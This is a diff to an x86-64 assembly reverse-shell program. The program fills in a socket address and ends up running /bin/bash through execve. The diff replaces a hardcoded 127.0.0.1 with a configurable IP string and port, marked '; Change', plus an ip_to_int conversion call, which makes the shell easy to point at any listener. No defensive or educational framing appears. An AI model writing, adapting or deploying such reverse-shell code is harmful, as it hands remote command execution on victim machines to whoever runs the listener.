@@ -1,3 +1,4 @@
+default rel
 global _start
 
 %define AF_INET 2
@@ -8,7 +9,7 @@ global _start
 %define SOCK_STREAM 1
 %define EXECVE 59
 
-%define PORT 1234
+extern ip_to_int
 
 section .text
 
@@ -17,13 +18,15 @@ _start:
     mov rbp, rsp
     sub rsp, 16
 
-    mov ax, PORT
-    xchg ah, al
+    mov bx, PORT
+    xchg bh, bl
 
-    ; TODO: Implement ip string to binary
+    lea rdi, [IP_ADDR]
+    call ip_to_int
+
     mov word  [rsp],   AF_INET
-    mov word  [rsp+2], ax
-    mov dword [rsp+4], 16777343 ; 127.0.0.1 in binary
+    mov word  [rsp+2], bx
+    mov dword [rsp+4], eax
     mov dword [rsp+8], 0 ; padding
 
     mov rdi, AF_INET
@@ -70,3 +73,7 @@ section .data
 s: dd 0
 binary: db "/bin/bash", 0
 argv: dq binary, 0
+
+; Change
+PORT: equ 1234
+IP_ADDR: db "127.0.0.1", 0
